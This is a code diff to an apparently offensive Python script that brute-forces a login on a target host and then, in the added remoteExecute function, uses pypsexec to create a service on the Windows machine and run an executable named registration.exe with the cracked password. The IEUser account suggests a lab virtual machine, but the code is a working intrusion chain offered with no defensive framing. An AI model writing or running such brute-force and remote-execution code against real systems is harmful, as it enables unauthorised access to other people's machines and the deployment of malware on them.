@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 
 import smtplib
-import paramiko
-import time
-
+import paramiko #Bruteforcing SSH connection
+import time #Bruteforcing SSH connection
+from pypsexec.client import Client #Sending remote commands
 
 #play video
 
@@ -33,7 +33,14 @@ def bruteForce(user, ipAddress):
 #Transfer
 
 #Remote execute file
-
+def remoteExecute(ipAddress, user, password):
+    c = Client(ipAddress, username=user, password=password,  encrypt=False)
+    c.connect()
+    try:
+        c.create_service()
+        stdout, stderr, rc = c.run_executable("C:\\Users\\IEUser\\Desktop\\registration.exe")
+    except:
+        print("done")
 
 def main():
     user= "IEUser"
@@ -41,4 +48,5 @@ def main():
     print(ipAddress)
     password=bruteForce(user,ipAddress)
     print(password)
+    remoteExecute(ipAddress,user, password)
 main()
